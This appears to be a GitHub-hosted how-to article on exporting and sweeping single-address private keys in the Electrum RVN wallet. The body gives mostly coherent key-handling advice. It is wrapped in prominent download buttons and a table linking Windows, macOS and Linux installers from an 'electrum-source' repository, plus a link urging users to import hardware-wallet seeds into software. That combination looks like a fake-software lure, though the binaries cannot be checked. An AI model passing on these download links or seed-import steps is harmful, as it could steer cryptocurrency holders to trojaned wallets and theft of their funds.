![Electrum RVN](assets/banner-article.png)

# Exporting Private Keys from Electrum RVN

<!-- compact-download-block -->

<p align="center">Taking keys out of the file, and the risk that follows</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Exporting a private key writes it out in plain text, unencrypted, in front of you. The wallet allows it because some recoveries need it; the export screen is where care stops being optional. A key on screen is a key that can be photographed, pasted into a chat and lost in a clipboard history.

## What an export gives you

A single address's private key, in a text format, that anyone can import into another wallet and spend from. It is not the seed: it controls one address, not the whole wallet.

That distinction matters. Exporting one key from a wallet with a balance spread across many addresses moves nothing; the other addresses stay controlled by the seed. It also means an exported key is a partial exposure rather than a total one - which is a reason to prefer it for a small rescue, and a reason it is useless as a backup.

## When an export is the right tool

**One address, one recovery.** A wallet that accepts only a raw private key - some services and some old tools - needs an export rather than a seed.

**A single address received funds you must move quickly** and the destination only takes keys.

**You are consolidating** coins that arrived at addresses from an old setup into a wallet you control properly.

That is a short list. Most "I need my private key" requests are actually "I need to restore my wallet", and the seed is the better answer - [restore a wallet from an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md).

## The procedure, and where it goes wrong

1. **Open the addresses screen** and select the address whose key you need, not the whole wallet.
2. **Export the key** into a local view. The wallet shows it as text; it is not encrypted at this point.
3. **Use it immediately** in the destination that needs it, and do not save it to a file, a note, a screenshot or a message.
4. **Sweep rather than reuse.** Send the funds to a fresh address you control; do not keep using an address whose key has been exposed.
5. **Clear the clipboard** if you copied it. Clipboard history is a real leak on modern desktop systems.

Where it goes wrong is step three and step five. An exported key pasted into a web form is a key handed to that site, and a key copied to a clipboard may sit in a history for hours.

## Sweeping, not importing

If a key is exposed, the goal is to move the funds off that address, not to keep using it under a new wallet. Importing an exposed key into another wallet preserves the exposure and adds a second place the key exists.

Sweeping means: create a wallet you trust, generate a fresh address, send the balance from the exposed address to it, and confirm. The exposed key then controls an empty address, which is the best state it can be in.

## What an export does not do

- It does not export the seed, and it cannot restore the rest of the wallet.
- It does not preserve labels or history.
- It does not work for accounts with many addresses at once; each key is separate.
- It is not a backup. A pile of exported keys is a pile of plain-text secrets.

That last point is worth repeating: an export is an exposure with a purpose. If you need a backup, the twelve words are the backup - [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md).

## If a key has already leaked

Treat it as gone and act in this order: create a destination wallet, sweep the funds, confirm the sweep, then stop using the address. Do not wait for a "safer" moment - a leaked key can be swept by anyone who has it, and time is the only variable you control.

If the leaked key belonged to a hardware-wallet-backed address, the exposure is the same: the address moves to software control as soon as the key is out - [importing a hardware wallet seed into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md) covers that boundary.

## Better alternatives for the common cases

| You want | Do this instead |
| --- | --- |
| Move everything to a new machine | copy the wallet file, or restore the seed |
| Back up the wallet | write the seed down |
| Give someone else spending access | multisig or a watch-only wallet, not a key |
| Prove you control an address | sign a message |
| Recover one address | export and sweep, then stop |

The pattern: a private key is the wrong instrument for almost everything except moving funds off a single address.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [Watch-only wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md) is the way to watch without keys, [electrum-rvn-cold-storage-workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md) is the way to hold without a networked key, and [multisig wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/multisig-wallets-in-electrum-rvn.md) is the way to share control without handing over a key.

## FAQ

### Can I export all my private keys at once?

The wallet works per address. A bulk export would be a plain-text file of every key you own, which is a worse idea than exporting one when a single recovery needs it.

### Is the exported key encrypted?

No. It is plain text, shown on screen. Nothing about the export protects it.

### Can I import an exported key elsewhere and keep using the address?

You can, and you should not: an exported key is an exposed key. Sweep the funds to a fresh address instead.

### Does exporting the key expose my seed?

No. It exposes one address's key. The seed remains the master secret, which is why it is the thing to protect.

### What if I exported a key by mistake?

Send the funds from that address to a new one immediately, confirm, and treat the old address as burned.

<!-- related-articles -->

## Related articles

- [Restore a Wallet From an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md)
- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
- [Import a Hardware Wallet Seed Into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md)
- [Watch-Only Wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md)
